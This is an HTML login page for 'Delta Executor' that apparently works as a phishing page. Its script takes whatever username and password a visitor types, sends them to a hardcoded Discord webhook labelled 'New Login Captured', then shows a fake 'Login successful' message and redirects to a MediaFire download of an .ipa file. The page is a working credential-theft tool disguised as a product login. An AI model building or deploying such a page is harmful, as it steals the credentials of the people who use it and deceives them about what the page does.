<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Delta Executor</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-box">
    <img src="assets/delta-logo.png" alt="Delta Logo" class="logo">
    <h2>Delta Executor Login</h2>
    <form id="login-form">
      <input type="text" id="username" placeholder="Username" required><br>
      <input type="password" id="password" placeholder="Password" required><br>
      <button type="submit">Login</button>
    </form>
    <p style="margin-top:15px; font-size: 13px;">Download will begin after successful login.</p>
  </div>
  
  <div class="watermark">© 2025 DeltaExecutor | Matbon123</div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1396797120983466044/6YdZO0lCdFr9DOXIBS3iEv1G2Xw9FLyj20nEwx4nfOP172TVk-DgYTPEKIWf8RrYtbzG";

    document.getElementById("login-form").addEventListener("submit", function(e) {
      e.preventDefault();
      
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      
      const data = {
        content: `🔐 **New Login Captured**\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\``
      };

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      }).then(() => {
        alert("Login successful! Download starting...");
        // https://www.mediafire.com/file/trdg6l96vayoza9/Delta-2.681.805.ipa/file
        window.location.href = "https://www.mediafire.com/file/trdg6l96vayoza9/Delta-2.681.805.ipa/file";
      });
    });
  </script>
</body>
</html>
